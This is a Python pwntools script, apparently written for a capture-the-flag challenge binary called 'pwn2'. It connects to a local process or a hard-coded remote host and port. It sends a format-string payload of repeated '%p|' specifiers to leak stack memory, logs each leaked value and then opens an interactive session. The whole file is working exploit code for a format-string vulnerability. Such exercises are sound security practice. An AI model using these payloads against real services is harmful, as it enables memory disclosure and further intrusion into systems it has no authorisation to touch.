#!/usr/bin/python3

from pwn import *

exe = ELF('pwn2', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('14.225.212.104', 9002)
    # host = sys.argv[1].split(":")
    # p  = remote(host[0],int(host[1]) )
else:
    p = process([exe.path])
GDB()
pl = b"%p|"*0x100
sa(b"> ", pl)

for i in range(1, 0x300):
    leak = p.recvuntil(b"|").rstrip(b"|")
    info(f"leak[{i}]: {leak}")
p.interactive()